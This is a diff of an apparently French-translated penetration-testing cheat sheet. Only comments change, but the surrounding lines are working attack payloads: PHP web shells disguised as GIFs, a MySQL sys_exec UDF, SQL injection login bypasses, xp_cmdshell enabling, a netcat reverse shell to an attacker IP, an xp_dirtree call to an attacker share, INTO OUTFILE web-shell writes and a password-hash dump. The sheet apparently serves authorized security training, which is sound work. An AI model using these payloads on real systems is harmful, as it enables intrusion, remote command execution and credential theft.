@@ -433,7 +433,7 @@ git commit [commitNumber]
 # Restore last commit
 git reset --hard
 
-# script automatique pour lire et restaurer la dernière dump git
+# Script de récupération d'un dépôt Git exposé
 ./extractor.sh /.git/ extracted
 
 ```
@@ -1587,7 +1587,7 @@ GIF89a;
 <?
 system($_GET['cmd']);//or you can insert your complete shell code
 ?>
-// or
+// Autre possibilité
 GIF8
 <?
 system($_GET['cmd']); //or you can insert your complete shell code
@@ -1848,7 +1848,7 @@ my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
 void sys_exec_deinit(UDF_INIT *initid);
 long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error);
 
-// Initialization function for UDF
+// Fonction d'initialisation de l'UDF
 my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
     if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
         strcpy(message, "sys_exec() requires exactly one string argument");
@@ -1857,12 +1857,12 @@ my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
     return 0;
 }
 
-// Cleanup function for UDF
+// Fonction de nettoyage de l'UDF
 void sys_exec_deinit(UDF_INIT *initid) {
-    // Nothing to do
+    // Aucune opération à effectuer
 }
 
-// Execution function
+// Fonction d'exécution
 long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
     const char *command = args->args[0];
     return system(command);
@@ -2608,25 +2608,25 @@ done > <filename.txt> && grep "0m9" <filename.txt
 -- Variante utilisant une condition OR
 ' OR 1=1 --+
 
--- Bypass with LIMIT (useful when multiple entries might be returned)
+-- Variante avec LIMIT pour limiter les entrées retournées
 ' OR 1=1 LIMIT 1 --+
 
--- Bypass by using string comparison (a common trick when numeric bypass fails)
+-- Variante par comparaison de chaînes lorsque la comparaison numérique échoue
 ' OR 'a'='a --+
 
 -- Combiner plusieurs conditions avec AND
 ' OR 3=3 --+
 
--- More obfuscated example (avoiding use of typical 1=1):
+-- Variante évitant la condition classique 1=1 :
 ' OR 2=2 --+
 
--- Bypass with string comparison (works for both MySQL and MSSQL)
+-- Variante par comparaison de chaînes compatible MySQL et MSSQL
 ' OR 'a'='a' --+
 
--- OR-based bypass with a numeric comparison
+-- Variante OR utilisant une comparaison numérique
 ' OR 3=3 --+
 
--- Bypass with LIMIT for MySQL (restricts to 1 entry)
+-- Variante MySQL avec LIMIT pour retourner une seule entrée
 ' OR 1=1 LIMIT 1 --+
 
 -- Limiter les résultats MSSQL avec TOP
@@ -2704,11 +2704,11 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 # Exemple de tronquage; la base de données rejette des caractères supplémentaires
 username=admin++++++++(max.length)&password=testpwn123
 
--- Assume the database has a 10-character limit on the username field, note that more characters are added because otherwise the truncation won't be made.
+-- Hypothèse : le champ utilisateur est limité à dix caractères ; le dépassement entraîne une troncature.
 username=admin++++++++&password=testpwn123
 
--- The database truncates the input to admin and discards the extra characters
--- If a user admin already exists, the attacker might be able to bypass authentication.
+-- La base conserve admin et ignore les caractères supplémentaires
+-- Si le compte admin existe, la troncature peut créer un risque de contournement
 
 ```
 
@@ -2789,10 +2789,10 @@ EXEC master..xp_dirtree '\\[Attacker_IP]\share\'
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
 
 ```sql
--- Visualize SQL statement and adjust payload
+-- Examiner la requête SQL et adapter la valeur de test
 INSERT INTO dbo.tablename ('<user_input>', '<user_input>'); 
 
--- Adjust initial payloads
+-- Adapter les premières valeurs de test
 INSERT INTO dbo.tablename ('1 AND 1=CONVERT(INT,@@version))-- ', '<user_input>'); 
 INSERT INTO dbo.tablename('', CONVERT(INT, db_name(<number>)))-- 
 
@@ -2811,7 +2811,7 @@ INSERT INTO dbo.tablename('', CONVERT(INT, db_name(<number>)))--
 <p class="oscp-command-note">Instruction SQL dans la rubrique « Remote Code Execution (RCE) ».</p>
 
 ```sql
--- Use this if you are doing SQL Injection.
+-- À utiliser pour un test d'injection SQL
 
 -- Activer les options avancées
 ';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- 
@@ -2826,7 +2826,7 @@ INSERT INTO dbo.tablename('', CONVERT(INT, db_name(<number>)))--
 
 
 ```sql
--- Use this if you have direct access to execute SQL statements.
+-- À utiliser si l'on dispose d'un accès SQL direct
 
 -- Activer les options avancées
 EXEC sp_configure 'show advanced options',1;
@@ -2844,7 +2844,7 @@ EXEC xp_cmdshell "C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [ka
 
 
 ```sql
--- Exploitation Example.
+-- Exemple de test
 
 -- Activer les options avancées
 <username>'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --
@@ -2958,7 +2958,7 @@ SELECT * FROM <table_name>;
 
 ```sql
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
--- or, using the ?cmd=[command] format
+-- Autre possibilité : utiliser ?cmd=[command]
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
 
 ```
@@ -2976,7 +2976,7 @@ SELECT system_user();
 -- Lister les bases de données
 SHOW DATABASES;
 
--- List users and their passwords (authentication_string)
+-- Lister les comptes et leurs empreintes (authentication_string)
 SELECT user, authentication_string FROM mysql.user WHERE user = '<username>';
 
 -- Énumérer les comptes de la base
@@ -3002,13 +3002,13 @@ FLUSH PRIVILEGES;
 <p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
 
 ```sql
--- General payload
+-- Exemple générique
 SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"
 
 -- Variante utilisant UNION
 ' union select '<?php system($_GET["cmd"]); ?>' into outfile '/srv/http/shell.php' -- -
 
--- Windows Payload
+-- Exemple Windows
 SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "C:/wamp/www/shell.php" 
 
 ```
@@ -3354,7 +3354,7 @@ done
 <p class="oscp-command-note">Extrait JavaScript lié à « AJAX Calls ».</p>
 
 ```javascript
-// Code Example
+// Exemple de code
 function changeUserPassword() {
     $.ajax({
         url:"change_password.php",
